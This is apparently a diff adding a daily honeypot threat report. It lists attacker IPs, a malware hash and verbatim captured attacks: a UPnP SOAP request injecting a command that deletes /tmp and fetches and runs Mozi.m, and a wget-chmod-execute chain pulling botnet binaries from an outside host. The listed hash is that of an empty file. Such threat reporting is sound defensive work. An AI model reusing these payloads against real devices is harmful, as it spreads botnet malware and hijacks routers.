@@ -1,0 +1,34 @@
+Top 5 IPs for 19-09-2024 :
+
+178.88.161.82
+140.246.178.147
+58.252.103.28
+58.223.177.24
+185.124.228.51
+
+
+Malware Observed:
+
+File Name : sshd
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+
+
+Commands/exploits observed :
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <Host IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://125.44.26.113:46474/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
+
+
+
+chmod +x x86_32.nn; ./x86_32.nn mutil.x86 etc; wget http://66.63.187.51/arm5.nn; chmod +x arm5.nn; ./arm7.nn mutil.arm5; wget http://66.63.187.51/arm6.nn; chmod +x arm6.nn; ./arm7.nn mutil.arm6; wget http://66.63.187.51/arm7.nn; chmod +x arm7.nn; ./arm7.nn mutil.arm7; wget http://66.63.187.51/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mutil.mipsel; wget http://66.63.187.51/mips.nn; chmod +x mips.nn; ./mips.nn mutil.mips; wget http://66.63.187.51/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn mutil.x86_64; wget http://66.63.187.51/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn mutil.x86 HTTP/1.1
